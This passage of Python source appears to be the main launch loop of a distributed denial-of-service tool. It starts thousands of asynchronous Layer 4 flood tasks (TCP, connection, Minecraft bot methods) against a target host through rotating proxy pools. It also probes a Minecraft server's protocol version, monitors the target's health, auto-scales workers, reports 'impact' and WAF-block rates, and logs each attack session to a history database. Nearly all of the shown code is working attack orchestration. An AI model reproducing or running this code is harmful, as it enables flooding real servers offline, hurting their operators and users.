                            proxy_pool.update_pool(tactical_proxies)
                        else:
                            proxy_pool.update_pool([])
                        
                        if refresh_mins > 0:
                            logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                            sentinel = ReloadSentinel(refresh_mins, con, proxy_li, proxy_ty, proxy_pool)
                            sentinel.start()
                        
                        if method not in {
                            "MINECRAFT",
                            "MCBOT",
                            "TCP",
                            "CPS",
                            "CONNECTION",
                        }:
                            exit("Layer 4 Proxy Incompatibility")
            
            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
            if method == "MCBOT":
                try:
                    reader, writer = await asyncio.open_connection(host, port)
                    writer.write(Minecraft.handshake((host, port), protocolid, 1))
                    writer.write(Minecraft.data(b"\x00"))
                    await writer.drain()
                    resp = await reader.read(1024)
                    pid = Tools.protocolRex.search(str(resp))
                    protocolid = (
                        con["MINECRAFT_DEFAULT_PROTOCOL"]
                        if not pid
                        else int(pid.group(1))
                    )
                    if 47 < protocolid > 758:
                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                    writer.close()
                    await writer.wait_closed()
                except: pass
            
            logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 async tasks...{bcolors.RESET}")
            for thread_id in range(threads):
                l4 = Layer4((host, port), ref, method, event, proxy_pool, protocolid)
                asyncio.create_task(l4.run())

        logger.info(
            f"{bcolors.OKGREEN}[*] COMMAND LAUNCHED: Target: {target_host} | Method: {method} | Duration: {timer}s | Workers: {threads}{bcolors.RESET}"
        )

        # --- Create Attack History Session ---
        if _session_id:
            _proxy_count = len(proxy_pool) if proxy_pool else 0
            await asyncio.to_thread(INTEL_DB.create_session,
                session_id=_session_id,
                target=target_host,
                method=method,
                threads=threads,
                duration=timer,
                proxy_type=str(proxy_ty) if 'proxy_ty' in locals() else "",
                proxy_count=_proxy_count
            )

        event.set()
        ts = time()

        # Start Health Monitor
        hm = HealthMonitor(
            target_host, port, "L7" if method in Methods.LAYER7_METHODS else "L4"
        )
        asyncio.create_task(hm.run())

        # Start Dynamic Scaler if autoscale enabled
        if ENGINE_STATE.active_threads_target.value > 0:
            scaler = DynamicScaler(target_host)
            # DynamicScaler is a Thread, it monitors psutil which might block
            scaler.start()

        while time() < ts + timer:
            # Capture metrics BEFORE reset for persistence
            _current_pps = int(REQUESTS_SENT)
            _current_bps = int(BYTES_SEND)
            _current_success = int(SUCCESS_SENT)
            _current_waf = int(WAF_SENT)
            _current_error = int(ERROR_SENT)
            _current_timeout = int(TIMEOUT_SENT)
            _current_lat = CURRENT_LATENCY.value
            _current_cpu = await asyncio.to_thread(psutil.cpu_percent, interval=0)
            _current_ram = psutil.virtual_memory().percent

            lat_str = (
                f"{_current_lat:.1f}ms"
                if _current_lat > 0
                else "TIMEOUT"
            )
            
            # Impact Reporting
            total_sampled = _current_success + _current_waf + _current_error + _current_timeout
            fidelity = round((_current_success / total_sampled * 100), 1) if total_sampled > 0 else 0.0
            impact_msg = f"Impact: {fidelity}% | OK: {_current_success}, WAF: {_current_waf}, ERR: {_current_error}, TMO: {_current_timeout}"

            logger.info(
                "Target: %s, Port: %s, Method: %s, PPS: %s, BPS: %s, Latency: %s, Pool: %d/%d / %d%%"
                % (
                    target_host,
                    port,
                    method,
                    Tools.humanformat(_current_pps),
                    Tools.humanbytes(_current_bps),
                    lat_str,
                    len(proxy_pool) if proxy_pool else 0,
                    proxy_pool.get_tactical_size() if proxy_pool else 0,
                    round((time() - ts) / timer * 100, 2),
                )
            )
            if total_sampled > 0:
                logger.info(f"{bcolors.OKCYAN}[*] {impact_msg}{bcolors.RESET}")

            # Persist metric to Attack History DB (non-blocking)
            if _session_id:
                # Store extra impact data in message for now or extend schema (v1.2.1 simplicity: use message)
                asyncio.create_task(asyncio.to_thread(INTEL_DB.record_metric,
                    _session_id, _current_pps, _current_bps,
                    _current_lat, _current_cpu, _current_ram
                ))

            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            SUCCESS_SENT.set(0)
            WAF_SENT.set(0)
            ERROR_SENT.set(0)
            TIMEOUT_SENT.set(0)
            await asyncio.sleep(1)

        event.clear()
        # Finalize session with aggregated stats
        if _session_id:
            await asyncio.to_thread(INTEL_DB.finalize_session, _session_id, 'completed')
        
        shutdown()
        import os
        os._exit(0)

    except (IndexError, ValueError):
        ToolsConsole.usage()
    except Exception as e:
        import traceback
        # Finalize session as error if it was created
        if '_session_id' in locals() and _session_id:
            await asyncio.to_thread(INTEL_DB.finalize_session, _session_id, 'error')
            await asyncio.to_thread(INTEL_DB.record_event, _session_id, 'error', str(e))
        logger.error(f"{bcolors.FAIL}[!] ENGINE_CRASH: Critical Failure during deployment.{bcolors.RESET}")
        logger.error(f"{bcolors.FAIL}[!] ERROR_DETAILS: {str(e)}{bcolors.RESET}")
        logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
        import os
        os._exit(1)

if __name__ == "__main__":
    with suppress(KeyboardInterrupt):
        asyncio.run(main_async())
